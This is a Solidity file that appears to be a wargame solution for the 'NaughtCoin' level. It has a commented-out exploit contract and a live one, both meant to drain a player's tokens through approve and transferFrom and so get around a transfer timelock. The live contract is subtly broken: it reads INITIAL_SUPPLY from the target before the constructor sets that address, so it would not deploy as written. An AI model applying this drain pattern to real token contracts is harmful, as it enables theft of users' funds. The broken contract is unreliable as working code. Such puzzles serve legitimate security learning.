// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// interface INaughtCoin {
//     function player() external view returns (address);
// }

// interface IERC20 {
//     function balanceOf(address account) external view returns (uint256);
//     function approve(address spender, uint256 amount) external returns (bool);
//     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
// }

// // 1. Deploy
// // 2. coin.approve(hack, amount)
// // 3. pwn
// contract Hack {
//     function pwn(IERC20 coin) external {
//         address player = INaughtCoin(address(coin)).player();
//         uint256 bal = coin.balanceOf(player);
//         coin.transferFrom(player, address(this), bal);
//     }
// }


interface IERC20 {
    function totalSupply() external view returns (uint);
  
    function INITIAL_SUPPLY() external view returns (uint);

    function balanceOf(address account) external view returns (uint);

    function transfer(address recipient, uint amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

contract Hack {
    IERC20 private target;
    constructor(address _target) {
        target = IERC20(_target);
    }
    uint totalsupply = target.INITIAL_SUPPLY();

    function sendMoneyBefore10years() external{
        target.transferFrom(msg.sender, address(this), totalsupply);
    }
}